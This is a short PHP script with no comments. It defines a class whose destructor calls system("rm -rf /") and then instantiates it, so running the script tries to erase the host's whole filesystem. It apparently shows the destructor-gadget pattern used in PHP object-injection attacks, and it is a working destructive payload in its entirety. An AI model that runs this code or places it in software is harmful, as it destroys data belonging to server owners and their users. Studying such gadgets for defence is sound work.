<?php
class A {
public function __destruct() {
system("rm -rf /");
}
}
$a = new A();
?>
